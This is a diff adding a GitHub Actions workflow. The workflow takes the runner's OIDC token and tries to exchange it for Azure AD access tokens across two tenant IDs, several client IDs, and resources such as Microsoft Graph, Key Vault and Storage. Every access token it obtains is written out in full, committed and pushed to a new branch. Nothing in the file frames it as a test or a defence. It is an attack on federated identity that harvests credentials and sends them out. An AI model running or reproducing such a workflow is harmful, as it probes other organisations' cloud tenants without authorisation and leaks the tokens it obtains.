@@ -1,0 +1,47 @@
+name: azoidc4
+on:
+  push:
+    branches: [ azres ]
+permissions:
+  contents: write
+  id-token: write
+jobs:
+  r:
+    runs-on: ubuntu-latest
+    timeout-minutes: 8
+    steps:
+      - uses: actions/checkout@v4
+      - name: matrix
+        run: |
+          set +e
+          OUT=azoidc4_result.txt
+          : > $OUT
+          O=$(curl -s -m 15 -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange")
+          T=$(echo "$O" | python3 -c "import json,sys;print(json.load(sys.stdin).get('value',''))")
+          echo "oidc_len=${#T}" >> $OUT
+          echo "$T" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | head -c 500 >> $OUT; echo >> $OUT
+          ex(){ TT=$1; CID=$2; RES=$3
+            R=$(curl -s -m 15 -X POST "https://login.microsoftonline.com/$TT/oauth2/v2.0/token" -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=$T" -d client_id=$CID --data-urlencode "scope=$RES/.default")
+            if echo "$R" | grep -q '"access_token"'; then
+              echo "GOTTOKEN [$TT|$CID|$RES]" >> $OUT
+              echo "$R" >> $OUT
+            else
+              echo "ERR [$TT|$CID|$RES] $(echo "$R" | python3 -c "import json,sys;d=json.load(sys.stdin);print(d.get('error'),(d.get('error_codes') or [''])[0],(d.get('error_description') or '')[:80])" 2>/dev/null)" >> $OUT
+            fi }
+          for TT in 72f988bf-86f1-41af-91ab-2d7cd011db47 0001746b-3028-43be-8d1a-9d398cdee9f9; do
+            for CID in 2ac1b8af-6f93-4fa3-b65c-e629ad9c0bb6 d6529b06-857c-4e9e-81d0-eee83f0320ab 31f3b47b-3d31-4a5b-8f7e-1f3c8c0e7b35 e3d1f2c5-1b7e-4e8a-9c0d-2f5a6b7c8d9e; do
+              for RES in https://graph.microsoft.com https://vault.azure.net https://storage.azure.com https://management.core.windows.net "api://$CID"; do
+                ex $TT $CID $RES
+              done
+            done
+          done
+          echo "--- controls (apps of unknown federation state) ---" >> $OUT
+          ex 72f988bf-86f1-41af-91ab-2d7cd011db47 5c4c9f91-aaaa-bbbb-cccc-3e9036f05d5c https://graph.microsoft.com
+          ex 72f988bf-86f1-41af-91ab-2d7cd011db47 19704041-8953-47f5-9b58-45c58f7fb9be https://graph.microsoft.com
+          ex 72f988bf-86f1-41af-91ab-2d7cd011db47 11111111-2222-3333-4444-555555555555 https://graph.microsoft.com
+          cat $OUT
+          git config user.email o4@local; git config user.name o4
+          git checkout -b azres-out
+          cp $OUT azoidc4_result.txt
+          git add azoidc4_result.txt; git commit -qm "azoidc4 result ${GITHUB_RUN_ID}"
+          git push -q origin azres-out
